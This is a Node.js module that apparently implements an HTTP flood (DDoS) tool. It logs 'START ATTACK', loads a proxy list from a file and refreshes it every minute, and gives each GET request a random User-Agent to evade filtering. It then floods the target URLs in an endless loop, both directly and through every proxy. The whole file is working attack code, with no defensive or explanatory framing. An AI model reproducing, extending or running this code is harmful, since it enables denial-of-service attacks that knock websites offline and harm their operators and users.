const request =         require('request');
const fs =              require('fs').promises;
const randomUseragent = require('random-useragent');

async function getProxyList() {
    return (await fs.readFile('proxy.txt', 'utf8')).split('\n').filter(proxy => proxy?.length);
}

module.exports = async ({ urls, useProxy, timeout = 0 }) => {
    let proxyList = await getProxyList();

    setInterval(async () => proxyList = await getProxyList(), 60000);

    console.log(`START ATTACK 💣: ${urls}`);

    const getParams = (url, proxy = false) => {
            const params = {
                url,
                method: 'GET',
                timeout: 500,
                headers: {
                    'User-Agent': randomUseragent.getRandom()
                }
            };
    
            if (proxy?.length) params.proxy = `http://${proxy}`;

            return params;
    }

    function attackWithProxy(timeout) {
        return setTimeout(() => {
            urls.forEach(url => {
                try {
                    request(getParams(url), (err) => {});
                } catch(err) {
                    return;
                }
    
                if (proxyList?.length) {
                    proxyList.forEach(proxy => {
                        try {
                            return request(getParams(url, proxy), (err) => {});
                        } catch(err) {
                            return;
                        }
                    });
                }
    
                return attackWithProxy(timeout);
            })
        }, +proxyList?.length + +timeout);
    }

    if (useProxy) {
        return attackWithProxy(timeout);
    } else {
        setInterval(() => {
            urls.forEach(url => {
                try {
                    // return request(getParams(url), () => {});
                    console.log({url})
                } catch(err) {
                    return;
                }
            })
    
            return;
        }, timeout);
    }
    
};

